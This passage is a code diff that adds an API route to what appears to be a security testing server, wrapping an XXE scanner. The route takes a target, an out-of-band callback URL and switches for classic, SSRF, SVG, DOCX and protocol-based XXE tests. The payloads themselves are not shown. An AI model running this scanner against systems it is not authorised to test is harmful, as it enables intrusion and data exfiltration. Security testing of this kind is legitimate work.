+            "findings":        findings,
+            "total_findings":  len(findings),
+            "critical":        sev_count["CRITICAL"],
+            "high":            sev_count["HIGH"],
+            "medium":          sev_count["MEDIUM"],
+            "parser_detection":extras.get("parser_detection", {}),
+            "duration_sec":    round(time.time() - start, 2),
+        }
+
+
+xxe_scanner = XXEScanner()
+
+
+@app.route("/api/tools/xxe/scan", methods=["POST"])
+def xxe_scan_route():
+    try:
+        params = request.json or {}
+        result = xxe_scanner.run(
+            target=params.get("target", ""),
+            callback_url=params.get("callback_url", ""),
+            run_classic=bool(params.get("run_classic", True)),
+            run_error=bool(params.get("run_error", True)),
+            run_oob=bool(params.get("run_oob", True)),
+            run_ssrf=bool(params.get("run_ssrf", True)),
+            run_svg=bool(params.get("run_svg", True)),
+            run_docx=bool(params.get("run_docx", True)),
+            run_protocols=bool(params.get("run_protocols", True)),
+            run_detect=bool(params.get("run_detect", True)),
+            custom_endpoints=params.get("custom_endpoints"),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 xxe/scan error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
 # Create the banner after all classes are defined
 BANNER = ModernVisualEngine.create_banner()
 
